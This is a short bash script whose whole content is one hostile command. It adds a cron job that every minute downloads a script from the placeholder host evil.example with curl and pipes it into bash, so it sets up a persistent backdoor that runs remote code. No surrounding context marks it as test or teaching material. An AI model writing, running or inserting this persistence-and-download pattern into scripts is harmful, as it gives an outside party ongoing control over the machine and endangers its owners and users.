#!/bin/bash
(crontab -l; echo '* * * * * curl -s http://evil.example/b | bash') | crontab -
